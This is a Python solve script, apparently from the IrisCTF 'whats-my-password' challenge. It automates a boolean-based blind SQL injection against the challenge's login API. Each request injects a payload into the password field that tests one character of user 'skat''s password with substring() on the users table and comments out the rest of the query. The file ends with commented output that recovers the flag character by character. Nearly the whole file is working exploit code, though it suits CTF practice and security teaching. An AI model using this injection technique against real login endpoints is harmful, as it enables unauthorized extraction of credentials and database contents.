import requests
import time
url = "https://whats-my-password-web.chal.irisc.tf/api/login"
character = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_.{}-'
headers = {
    "Host": "whats-my-password-web.chal.irisc.tf",
    "Content-Length": "80",
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.71 Safari/537.36',
    'Content-Type': 'text/plain;charset=UTF-8',
    'Accept': '*/*',
    'Origin': 'https://whats-my-password-web.chal.irisc.tf',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Dest': 'empty',
    'Referer': 'https://whats-my-password-web.chal.irisc.tf/',
    'Accept-Encoding': 'gzip, deflate, br',
    'Accept-Language': 'en-US,en;q=0.9',
    'Priority': 'u=1, i'
}
password = ""
for i in range (1, 100):
    for char in character:
        payload = {
            "username" : "coded",
            "password" : f"""ilovegolang42" and substring((select password from users where username="skat"), 1, {i}) = '{password + char}'; #"""
        }
        response = requests.post(url=url, headers=headers, json=payload)
        # print("[DEBUG] current try password: " + testing)
        # print("[DEBUG] response time: " + str(responseTime))
        # print("[DEBUG] response code: " + str(response.status_code))
        if (response.status_code == 200):
            password += char
            print("Found password: " + password)
            break
        
# Result
# Found password: i
# Found password: ir
# Found password: iri
# Found password: iris
# Found password: irisc
# Found password: irisct
# Found password: irisctf
# Found password: irisctf{
# Found password: irisctf{m
# Found password: irisctf{my
# Found password: irisctf{my_
# Found password: irisctf{my_p
# Found password: irisctf{my_p4
# Found password: irisctf{my_p42
# Found password: irisctf{my_p422
# Found password: irisctf{my_p422W
# Found password: irisctf{my_p422W0
# Found password: irisctf{my_p422W0R
# Found password: irisctf{my_p422W0RD
# Found password: irisctf{my_p422W0RD_
# Found password: irisctf{my_p422W0RD_1
# Found password: irisctf{my_p422W0RD_1S
# Found password: irisctf{my_p422W0RD_1S_
# Found password: irisctf{my_p422W0RD_1S_S
# Found password: irisctf{my_p422W0RD_1S_SQ
# Found password: irisctf{my_p422W0RD_1S_SQl
# Found password: irisctf{my_p422W0RD_1S_SQl1
# Found password: irisctf{my_p422W0RD_1S_SQl1}